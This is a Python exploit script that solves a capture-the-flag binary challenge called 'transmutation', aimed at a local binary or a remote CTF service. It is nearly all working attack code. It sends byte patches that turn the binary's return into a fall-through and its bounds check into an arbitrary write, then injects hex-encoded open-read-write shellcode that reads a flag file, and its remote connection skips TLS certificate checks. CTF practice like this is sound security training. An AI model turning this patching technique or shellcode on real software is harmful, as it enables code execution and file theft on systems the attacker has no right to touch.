#!/usr/bin/env python3
import argparse
import socket
import ssl
import subprocess
import sys


HOST = "transmutation.opus4-7.b01le.rs"
PORT = 8443
BIN = "./chall"
LOADER = "./ld-linux-x86-64.so.2"
LIBDIR = "."

# Stage 1: replace final `ret` in chall with 0x48 so execution falls through
# into main+1 and we get repeated chall() invocations.
RET_FALLTHROUGH_PATCH = (0x48, 0x48)

# Stage 2: turn `jge +0x14` into `jge +0x00`, which makes the store path run
# for all subsequent iterations, including offsets outside chall().
ARBITRARY_WRITE_PATCH = (0x00, 0x31)

# Final shellcode lives at main's original post-chall return site 0x4011f3,
# then we restore chall's ret so execution returns straight into shellcode.
SHELLCODE_BASE_OFF = 0xAD
RESTORE_RET_PATCH = (0xC3, 0x48)

# ORW shellcode for local testing. Opens ./flag.txt.
LOCAL_SHELLCODE = bytes.fromhex(
    "31 c0 b0 02 48 8d 3d 2e 00 00 00 31 f6 31 d2 0f 05"
    "89 c7 31 c0 48 89 e6 ba 40 00 00 00 0f 05 89 c2 b8"
    "01 00 00 00 bf 01 00 00 00 48 89 e6 0f 05 b8 3c 00"
    "00 00 31 ff 0f 05 66 6c 61 67 2e 74 78 74 00"
)

# ORW shellcode for remote. Opens /app/flag.txt.
REMOTE_SHELLCODE = bytes.fromhex(
    "31 c0 b0 02 48 8d 3d 32 00 00 00 31 f6 31 d2 0f 05"
    "89 c7 31 c0 48 89 e6 ba 40 00 00 00 0f 05 89 c2 b8"
    "01 00 00 00 bf 01 00 00 00 48 89 e6 0f 05 b8 3c 00"
    "00 00 31 ff 0f 05 2f 61 70 70 2f 66 6c 61 67 2e 74"
    "78 74 00"
)


def patch(byte, off):
    return bytes((byte & 0xFF, off & 0xFF))


def build_payload(shellcode: bytes) -> bytes:
    payload = bytearray()
    payload += patch(*RET_FALLTHROUGH_PATCH)
    payload += patch(*ARBITRARY_WRITE_PATCH)
    for i, b in enumerate(shellcode):
        payload += patch(b, SHELLCODE_BASE_OFF + i)
    payload += patch(*RESTORE_RET_PATCH)
    return bytes(payload)


def local_argv(gdb: bool) -> list[str]:
    prog = [LOADER, "--library-path", LIBDIR, BIN]
    if gdb:
        return ["gdb", "-q", "--args", *prog]
    return prog


def run_local(payload: bytes, gdb: bool = False):
    proc = subprocess.run(local_argv(gdb), input=payload, capture_output=True)
    return proc.returncode, proc.stdout, proc.stderr


def run_remote(payload: bytes, host: str, port: int, use_ssl: bool = True) -> bytes:
    sock = socket.create_connection((host, port))
    if use_ssl:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        sock = ctx.wrap_socket(sock, server_hostname=host)
    try:
        sock.sendall(payload)
        chunks = []
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            chunks.append(chunk)
        return b"".join(chunks)
    finally:
        sock.close()


def main():
    parser = argparse.ArgumentParser(description="Solve transmutation")
    parser.add_argument("--remote", action="store_true", help="use remote service")
    parser.add_argument("--gdb", action="store_true", help="run local binary under gdb")
    parser.add_argument("--host", default=HOST)
    parser.add_argument("--port", type=int, default=PORT)
    parser.add_argument("--no-ssl", action="store_true")
    args = parser.parse_args()

    shellcode = REMOTE_SHELLCODE if args.remote else LOCAL_SHELLCODE
    payload = build_payload(shellcode)

    if args.remote:
        out = run_remote(payload, args.host, args.port, not args.no_ssl)
        sys.stdout.buffer.write(out)
        return

    rc, stdout, stderr = run_local(payload, gdb=args.gdb)
    print(f"returncode={rc}")
    if stdout:
        sys.stdout.buffer.write(stdout)
    if stderr:
        sys.stderr.buffer.write(stderr)


if __name__ == "__main__":
    main()
